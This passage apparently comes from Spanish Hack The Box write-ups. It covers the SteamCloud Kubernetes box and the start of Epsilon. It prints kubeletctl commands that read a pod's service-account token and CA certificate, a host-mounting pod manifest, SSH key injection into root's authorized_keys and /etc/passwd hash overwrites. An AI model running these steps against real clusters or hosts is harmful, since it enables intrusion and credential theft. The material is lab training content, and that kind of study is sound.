./kubeletctl run 'cat /root/user.txt' --namespace default --pod nginx --container nginx --server 10.10.11.133 417b04ea8221ce9aa994877243e5fd98  Escalada de privilegios Ahora que podemos ejecutar comandos dentro de un contenedor de un Pod, podemos coger el token y el certificado de cliente para poder autenticarnos contra el kube-apiserver (puerto 8443):\n$ ./kubeletctl run 'cat /run/secrets/kubernetes.io/serviceaccount/token' --namespace default --pod nginx --container nginx --server 10.10.11.133 eyJhbGciOiJSUzI1NiIsImtpZCI6IkJwZHBDYnJzNUptVHlVd1YxeGlzR2lGYlpQX2xYUzlGY3k0MFd5MGo5Zk0ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9 jYWwiXSwiZXhwIjoxNjc2NDc0MTk1LCJpYXQiOjE2NDQ5MzgxOTUsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY 2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImEzNmU2NGZkLTlhZGEtNDcwOC1iMDEyLTM0N2VhMmVjOTliMCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInV pZCI6Ijk5MjUzMjU0LThiNjMtNDZiMi04MWUwLWY2ODQ1NzkzODgzMiJ9LCJ3YXJuYWZ0ZXIiOjE2NDQ5NDE4MDJ9LCJuYmYiOjE2NDQ5MzgxOTUsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhd Wx0OmRlZmF1bHQifQ.Xft1ybVzOOWCwsN7JwjoUxEFoAgOKSMU9MRBuwRGT5r2ruqX7ZcDnyMV3xe0Zcx-JGKPz3QY0EfdapLeldo_7_PfT3pXWZ1YkIuExpGSId9hHhIUXb89lc9IccH1mXkf3tHHEXjf9HYF pYCR6yRab8pcrgcpWZPtGWSIKmZC7D9YfkFerfKGT06c69YXhbdhOgXATEPu9cX6ihBCjHcu_zm8xqY1JDA4zjLj-dWy6lcwo8Q_FKR3irDr8DZP6t-SmL7yKeGL1IOSirY1rDazwG8R0YG2Xk0n-Ff-moo5B3 Kg4Jv-Cb74wD2bUVb2OeOpNKAD7WGynKTqf_JVa2FHTQ $ token=$(./kubeletctl run 'cat /run/secrets/kubernetes.io/serviceaccount/token' --namespace default --pod nginx --container nginx --server 10.10.11.133) $ ./kubeletctl run 'cat /run/secrets/kubernetes.io/serviceaccount/ca.crt' --namespace default --pod nginx --container nginx --server 10.10.11.133 | tee ca.crt -----BEGIN CERTIFICATE----- MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa YRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M HLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7 deqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG VeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll hnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmkfgYORyg99o 1pRrbLrfNk6DE5S9VSUCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW BBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiG9w0BAQsFAAOCAQEA0jqg5pUm lt1jIeLkYT1E6C5xykW0X8mOWzmok17rSMA2GYISqdbRcw72aocvdGJ2Z78X/HyO DGSCkKaFqJ9+tvt1tRCZZS3hiI+sp4Tru5FttsGy1bV5sa+w/+2mJJzTjBElMJ/+ 9mGEdIpuHqZ15HHYeZ83SQWcj0H0lZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D xpCJgRAw0IUgK74EdYNZAkrWuSOA0Ua8KiKuhklyZv38Jib3FvAo4JrBXlSjW/R0 JWSyodQkEF60Xh7yd2lRFhtyE8J+h1HeTz4FpDJ7MuvfXfoXxSDQOYNQu09iFiMz kf2eZIBNMp0TFg== -----END CERTIFICATE-----  Para comunicarnos con el kube-apiserver podemos utilizar kubectl (no kubeletctl) indicando la URL del kube-apiserver, el token y el certificado de cliente.\nLa idea es crear un Pod con un volumen que monte el sistema de archivo de la máquina host, de manera que podamos ejecutar comandos desde el Pod para leer archivos de la máquina (como /root/root.txt).\nEste es el descriptor del Pod que desplegaremos:\napiVersion: v1 kind: Pod metadata: name: escaper spec: containers: - name: escaper image: nginx:1.14.2 volumeMounts: - name: logs mountPath: /var/log/host volumes: - name: logs hostPath: path: / type: Directory  Este Pod montará / desde la máquina host en la ruta /var/log/host del contenedor (podríamos haber elegido otra ruta).\nPodemos aplicarlo utilizando kubectl:\n$ kubectl --token=$token --certificate-authority=./ca.crt apply -f escaper.yaml -n default -s https://10.10.11.133:8443 pod/escaper created  Ahora ya está desplegado en el cluster de Kubernetes. Podemos comprobarlo mediante kubeletctl:\n$ ./kubeletctl scan rce --server 10.10.11.133 ┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐ │ Node with pods vulnerable to RCE │ ├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤ │ │ NODE IP │ PODS │ NAMESPACE │ CONTAINERS │ RCE │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ │ │ │ │ │ RUN │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 1 │ 10.10.11.133 │ nginx │ default │ nginx │ + │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 2 │ │ etcd-steamcloud │ kube-system │ etcd │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 3 │ │ kube-scheduler-steamcloud │ kube-system │ kube-scheduler │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 4 │ │ coredns-78fcd69978-hrszm │ kube-system │ coredns │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 5 │ │ kube-apiserver-steamcloud │ kube-system │ kube-apiserver │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 6 │ │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 7 │ │ storage-provisioner │ kube-system │ storage-provisioner │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 8 │ │ kube-proxy-dnxrw │ kube-system │ kube-proxy │ + │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 9 │ │ escaper │ default │ escaper │ + │ └───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘  Y entonces podemos ejecutar comandos en el nuevo contenedor:\n$ ./kubeletctl run 'ls -la --time-style=%2b /var/log/host' --namespace default --pod escaper --container escaper --server 10.10.11.133 total 68 drwxr-xr-x 18 root root 4096 . drwxr-xr-x 1 root root 4096 .. lrwxrwxrwx 1 root root 7 bin - usr/bin drwxr-xr-x 3 root root 4096 boot drwxr-xr-x 16 root root 3080 dev drwxr-xr-x 75 root root 4096 etc drwxr-xr-x 3 root root 4096 home lrwxrwxrwx 1 root root 31 initrd.img - boot/initrd.img-4.19.0-18-amd64 lrwxrwxrwx 1 root root 31 initrd.img.old - boot/initrd.img-4.19.0-14-amd64 lrwxrwxrwx 1 root root 7 lib - usr/lib lrwxrwxrwx 1 root root 9 lib32 - usr/lib32 lrwxrwxrwx 1 root root 9 lib64 - usr/lib64 lrwxrwxrwx 1 root root 10 libx32 - usr/libx32 drwx------ 2 root root 16384 lost+found drwxr-xr-x 3 root root 4096 media drwxr-xr-x 2 root root 4096 mnt drwxr-xr-x 5 root root 4096 opt dr-xr-xr-x 210 root root 0 proc drwx------ 4 root root 4096 root drwxr-xr-x 20 root root 620 run lrwxrwxrwx 1 root root 8 sbin - usr/sbin drwxr-xr-x 2 root root 4096 srv dr-xr-xr-x 13 root root 0 sys drwxrwxrwt 10 root root 4096 tmp drwxr-xr-x 14 root root 4096 usr drwxr-xr-x 11 root root 4096 var lrwxrwxrwx 1 root root 28 vmlinuz - boot/vmlinuz-4.19.0-18-amd64 lrwxrwxrwx 1 root root 28 vmlinuz.old - boot/vmlinuz-4.19.0-14-amd64  Vemos que se trata del sistema de archivos de la máquina:\n$ ./kubeletctl run 'cat /var/log/host/etc/hostname' --namespace default --pod escaper --container escaper --server 10.10.11.133 steamcloud  Y por tanto, podemos leer la flag root.txt:\n$ ./kubeletctl run 'ls -la --time-style=%2b /var/log/host/root' --namespace default --pod escaper --container escaper --server 10.10.11.133 total 28 drwx------ 4 root root 4096 . drwxr-xr-x 18 root root 4096 .. lrwxrwxrwx 1 root root 9 .bash_history - /dev/null -rw-r--r-- 1 root root 570 .bashrc drwxr-x--- 3 root root 4096 .kube drwxr-xr-x 10 root root 4096 .minikube -rw-r--r-- 1 root root 148 .profile -rw-r--r-- 1 root root 33 root.txt $ ./kubeletctl run 'cat /var/log/host/root/root.txt' --namespace default --pod escaper --container escaper --server 10.10.11.133 61f3bca8afe7785058a1be1972592526  Consiguiendo una shell como root Encontré dos maneras de conseguir una shell como root:\n Añadir una clave pública de SSH en /root/.ssh/authorized_keys. Modificar las contraseñas de user y root en /etc/passwd.  Para ambos métodos, tenemos que tener en cuenta que no podemos ejecutar comandos que tengan caracteres especiales como comillas (', \u0026quot;), pipes (|), redirecciones (\u0026gt;, \u0026gt;\u0026gt;, \u0026lt;, \u0026lt;\u0026lt;\u0026lt;) o salidas de ejecución ($(...), `...`) debido a la manera en la que tenemos RCE.\nAfortunadamente, podemos utilizar sed para reemplazar texto en un archivo, y podemos omitir las comillas si la sustitución no contiene espacios o caracteres especiales como los de antes.\nMi idea inicial fue copiar /etc/hosts (en el montaje de volumen) y modificarlo:\n$ ./kubeletctl run 'cp /var/log/host/etc/hosts /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 $ ./kubeletctl run 'cat /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 127.0.0.1 localhost 127.0.1.1 steamcloud # The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 127.0.0.1 host.minikube.internal 10.10.11.133 control-plane.minikube.internal  Ahora podemos comenzar quitando líneas del archivo:\n$ ./kubeletctl run 'sed -i s/f.*//g /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 $ ./kubeletctl run 'sed -i s/:.*//g /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 $ ./kubeletctl run 'sed -i s/127.*//g /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 $ ./kubeletctl run 'cat /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 # The 10.10.11.133 control-plane.minikube.internal  En este punto, para quitar la primera línea, tenemos que utilizar ..The para conseguir una coincidencia con RegEx, ya que # es un carácter especial.\n$ ./kubeletctl run 'sed -i s/..The//g /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 $ ./kubeletctl run 'cat /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 10.10.11.133 control-plane.minikube.internal  Ahora podemos modificar 10.10.11.133 por ssh-rsa y control-plane.minikube.internal por la clave pública:\n$ ./kubeletctl run 'sed -i s/10.10.11.133/ssh-rsa/g /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 $ ./kubeletctl run 'cat /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 ssh-rsa control-plane.minikube.internal  Para generar un par de claves SSH utilizamos ssh-keygen:\n$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (~/.ssh/id_rsa): ./id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in ./id_rsa Your public key has been saved in ./id_rsa.pub The key fingerprint is: SHA256:7aEfZ2kv6cZXqHKtyYKPtuPW7CTkAl4OqLYkkXd9ehY The key's randomart image is: +---[RSA 3072]----+ | | | | | | | . . . . | |o o + o E o . | | + o = = + . .. .| |oo . + *++.=+ . | |+ . +===*Boo | | . ++=+*=+. | +----[SHA256]-----+ $ cat id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt7J5RU3r/Dohol6WM7YjW5SAhGyGsD9yALiXIe7CJr7l5ZhQbhw7JOGKZQxPVQpRNa3eCTu632VcqJ6Rnrn/7FOQbAyeKko1BdJwlTlrxaNSo+WyT0pjuCIFFV88kHDqwZ6OpaIIZhIkHjH35ZPfhGQJJ2WMidVM3mcx9384j2XNI2zo8R1l7jIC4dKLHUifM2jt4Yxr2JyuBJgOlAdre57mI63PKJkbUz3wtAYLabs3BYtcXHEGj1OGGWwf+PsyatCdhMu72ZlwZQRs4RVPw26hhiwrdRDVyreJ3ceK8k1yDf9kHwqNOA8qa82oDdXLJWjfBxvQwgJTSeFqtmdpio5yXfGoSKU1Eji/y1XA8Nx1TfT23xHaCIX8VWYtPJ75GvbTr8fXxqgq/qIqQy9xVwwl2KJ3df/5vobh4vYsU6O9lsGROSpkMG5tQ3W9dkWjAccWHzvXHrcot+k0KxaLZpY+DxmnxInlkum6pwjDRXyNPsCooikIiSTD7pJjj94k=  Para copiar esta clave, tenemos que codificar los + (%2b) y el = (%3d) en codificación URL debido a la naturaleza del RCE que tenemos. Además, hay que escapar todas las barras porque sed también utiliza barras para distinguir los textos antiguo y nuevo. También podemos codificar las barras / (%2f) por si acaso:\n$ cat id_rsa.pub | sed 's/+/%2b/g' | sed 's/\\//\\\\%2f/g' | sed 's/=/%3d/g' ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt7J5RU3r\\%2fDohol6WM7YjW5SAhGyGsD9yALiXIe7CJr7l5ZhQbhw7JOGKZQxPVQpRNa3eCTu632VcqJ6Rnrn\\%2f7FOQbAyeKko1BdJwlTlrxaNSo%2bWyT0pjuCIFFV88kHDqwZ6OpaIIZhIkHjH35ZPfhGQJJ2WMidVM3mcx9384j2XNI2zo8R1l7jIC4dKLHUifM2jt4Yxr2JyuBJgOlAdre57mI63PKJkbUz3wtAYLabs3BYtcXHEGj1OGGWwf%2bPsyatCdhMu72ZlwZQRs4RVPw26hhiwrdRDVyreJ3ceK8k1yDf9kHwqNOA8qa82oDdXLJWjfBxvQwgJTSeFqtmdpio5yXfGoSKU1Eji\\%2fy1XA8Nx1TfT23xHaCIX8VWYtPJ75GvbTr8fXxqgq\\%2fqIqQy9xVwwl2KJ3df\\%2f5vobh4vYsU6O9lsGROSpkMG5tQ3W9dkWjAccWHzvXHrcot%2bk0KxaLZpY%2bDxmnxInlkum6pwjDRXyNPsCooikIiSTD7pJjj94k%3d $ ./kubeletctl run 'sed -i s/control-plane.minikube.internal/AAAAB3NzaC1yc2EAAAADAQABAAABgQCt7J5RU3r\\%2fDohol6WM7YjW5SAhGyGsD9yALiXIe7CJr7l5ZhQbhw7JOGKZQxPVQpRNa3eCTu632VcqJ6Rnrn\\%2f7FOQbAyeKko1BdJwlTlrxaNSo%2bWyT0pjuCIFFV88kHDqwZ6OpaIIZhIkHjH35ZPfhGQJJ2WMidVM3mcx9384j2XNI2zo8R1l7jIC4dKLHUifM2jt4Yxr2JyuBJgOlAdre57mI63PKJkbUz3wtAYLabs3BYtcXHEGj1OGGWwf%2bPsyatCdhMu72ZlwZQRs4RVPw26hhiwrdRDVyreJ3ceK8k1yDf9kHwqNOA8qa82oDdXLJWjfBxvQwgJTSeFqtmdpio5yXfGoSKU1Eji\\%2fy1XA8Nx1TfT23xHaCIX8VWYtPJ75GvbTr8fXxqgq\\%2fqIqQy9xVwwl2KJ3df\\%2f5vobh4vYsU6O9lsGROSpkMG5tQ3W9dkWjAccWHzvXHrcot%2bk0KxaLZpY%2bDxmnxInlkum6pwjDRXyNPsCooikIiSTD7pJjj94k%3d/g /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133  Y ahora que hemos terminado con las sustituciones, conseguimos un archivo que es válido como authorized_keys:\n$ ./kubeletctl run 'cat /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt7J5RU3r/Dohol6WM7YjW5SAhGyGsD9yALiXIe7CJr7l5ZhQbhw7JOGKZQxPVQpRNa3eCTu632VcqJ6Rnrn/7FOQbAyeKko1BdJwlTlrxaNSo+WyT0pjuCIFFV88kHDqwZ6OpaIIZhIkHjH35ZPfhGQJJ2WMidVM3mcx9384j2XNI2zo8R1l7jIC4dKLHUifM2jt4Yxr2JyuBJgOlAdre57mI63PKJkbUz3wtAYLabs3BYtcXHEGj1OGGWwf+PsyatCdhMu72ZlwZQRs4RVPw26hhiwrdRDVyreJ3ceK8k1yDf9kHwqNOA8qa82oDdXLJWjfBxvQwgJTSeFqtmdpio5yXfGoSKU1Eji/y1XA8Nx1TfT23xHaCIX8VWYtPJ75GvbTr8fXxqgq/qIqQy9xVwwl2KJ3df/5vobh4vYsU6O9lsGROSpkMG5tQ3W9dkWjAccWHzvXHrcot+k0KxaLZpY+DxmnxInlkum6pwjDRXyNPsCooikIiSTD7pJjj94k=  Entonces, creamos un directorio llamado .ssh y añadimos este archivo como authorized_keys:\n$ ./kubeletctl run 'mkdir /var/log/host/root/.ssh' --namespace default --pod escaper --container escaper --server 10.10.11.133 $ ./kubeletctl run 'cp /var/log/host/tmp/asdf /var/log/host/root/.ssh/authorized_keys' --namespace default --pod escaper --container escaper --server 10.10.11.133  Y tenemos una shell como root:\n$ ssh -i id_rsa root@10.10.11.133 root@steamcloud:~# cat root.txt 61f3bca8afe7785058a1be1972592526  El segundo método es algo más simple. Tenemos este archivo /etc/passwd:\n$ ./kubeletctl run 'cat /var/log/host/etc/passwd' --namespace default --pod escaper --container escaper --server 10.10.11.133 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin user:x:1000:1000:user,,,:/home/user:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin  Necesitamos modificar la contraseña de user para ganar acceso por SSH (probé primero con root pero no funcionó, a lo mejor tenía deshabilitado la autenticación SSH con contraseña).\nPara este propósito, podemos utilizar sed otra vez evitando el uso de comillas y caracteres especiales. La contraseña que vamos a poner es asdf en formato DES Unix:\n$ openssl passwd asdf J8Ufwh9mVJ3VI  $ ./kubeletctl run 'sed -i s/user:x/user:J8Ufwh9mVJ3VI/g /var/log/host/etc/passwd' --namespace default --pod escaper --container escaper --server 10.10.11.133 $ ./kubeletctl run 'cat /var/log/host/etc/passwd' --namespace default --pod escaper --container escaper --server 10.10.11.133 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin user:J8Ufwh9mVJ3VI:1000:1000:user,,,:/home/user:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin  Se observa que la contraseña se ha configurado. Ahora podemos acceder por SSH:\n$ ssh user@10.10.11.133 user@10.10.11.133's password: user@steamcloud:~$ id uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)  No podemos ejecutar sudo pero podemos cambiarle la contraseña a root:\n$ ./kubeletctl run 'sed -i s/root:x/root:J8Ufwh9mVJ3VI/g /var/log/host/etc/passwd' --namespace default --pod escaper --container escaper --server 10.10.11.133 $ ./kubeletctl run 'cat /var/log/host/etc/passwd' --namespace default --pod escaper --container escaper --server 10.10.11.133 root:J8Ufwh9mVJ3VI:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin user:J8Ufwh9mVJ3VI:1000:1000:user,,,:/home/user:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin  Y ahora simplemente añadimos asdf como contraseña y ganamos acceso como root:\nuser@steamcloud:~$ su root Password: root@steamcloud:/home/user# cat /root/root.txt 61f3bca8afe7785058a1be1972592526  ","image":"/images/HTB/SteamCloud/SteamCloud.png","permalink":"https://7rocky.github.io/htb/steamcloud/","section":"htb","summary":"Hack The Box. Linux. Máquina fácil. Esta máquina tiene un cluster de Kubernetes que expone el kubelet y es vulnerable a RCE sin autenticación. Somos capaces de extraer credenciales de un Pod en ejecución y utilizarlas para crear un Pod malicioso que monta el sistema de archivos de la máquina anfitriona. Para comprometer esta máquina se necesitan conocimientos de pentesting en Kubernetes","time":10,"title":"SteamCloud"},{"contents":"  SO: Linux   Dificultad: Media   Dirección IP: 10.10.11.134   Fecha: 07 / 02 / 2022   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.134 -p 22,80,5000 Nmap scan report for 10.10.11.134 Host is up (0.045s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http Apache httpd 2.4.41 | http-git: | 10.10.11.134:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file 'description' to name the... |_ Last commit message: Updating Tracking API # Please enter the commit message for... |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: 403 Forbidden 5000/tcp open http Werkzeug httpd 2.0.2 (Python 3.8.10) |_http-title: Costume Shop Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 8.86 seconds  La máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP) y 5000 (HTTP).\nEnumeración web Existe una página web en el puerto 5000. Tiene este aspecto:\nPodemos enumerar más rutas pero no podemos acceder a ellas porque no tenemos credenciales válidas aún:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.134:5000/FUZZ home [Status: 302, Size: 208, Words: 21, Lines: 4] order [Status: 302, Size: 208, Words: 21, Lines: 4] track [Status: 200, Size: 4288, Words: 631, Lines: 234] [Status: 200, Size: 3550, Words: 522, Lines: 205]  Enumeración de un repositorio de Git La salida de nmap indica que hay un repositorio de Git expuesto en el puerto 80.\nPodemos utilizar alguna herramienta como git-dumper, pero esta vez utilicé gitdumper.sh de GitTools:\n$ bash gitdumper.sh http://10.10.11.134/.git/ ./epsilon_git ########### # GitDumper is part of https://github.com/internetwache/GitTools # # Developed and maintained by @gehaxelt from @internetwache # # Use at your own risk. Usage might be illegal in certain circumstances. # Only for educational purposes! ########### [*] Destination folder does not exist [+] Creating ./epsilon/.git/ [+] Downloaded: HEAD [-] Downloaded: objects/info/packs [+] Downloaded: description [+] Downloaded: config [+] Downloaded: COMMIT_EDITMSG [+] Downloaded: index [-] Downloaded: packed-refs [+] Downloaded: refs/heads/master [-] Downloaded: refs/remotes/origin/HEAD [-] Downloaded: refs/stash [+] Downloaded: logs/HEAD [+] Downloaded: logs/refs/heads/master [-] Downloaded: logs/refs/remotes/origin/HEAD [-] Downloaded: info/refs [+] Downloaded: info/exclude [-] Downloaded: /refs/wip/index/refs/heads/master [-] Downloaded: /refs/wip/wtree/refs/heads/master [+] Downloaded: objects/c6/22771686bd74c16ece91193d29f85b5f9ffa91 [-] Downloaded: objects/00/00000000000000000000000000000000000000 [+] Downloaded: objects/7c/f92a7a09e523c1c667d13847c9ba22464412f3 [+] Downloaded: objects/c5/1441640fd25e9fba42725147595b5918eba0f1 [+] Downloaded: objects/b1/0dd06d56ac760efbbb5d254ea43bf9beb56d2d [+] Downloaded: objects/ce/401ccecf421ff19bf43fafe8a60a0d0f0682d0 [+] Downloaded: objects/5c/52105750831385d4756111e1103957ac599d02 [+] Downloaded: objects/b5/f4c99c772eeb629e53d284275458d75ed9a010 [+] Downloaded: objects/ab/07f7cdc7f410b8c8f848ee5674ec550ecb61ca [+] Downloaded: objects/cf/489a3776d2bf87ac32de4579e852a4dc116ce8 [+] Downloaded: objects/65/b80f62da28254f67f0bea392057fd7d2330e2d [+] Downloaded: objects/df/dfa17ca5701b1dca5069b6c3f705a038f4361e [+] Downloaded: 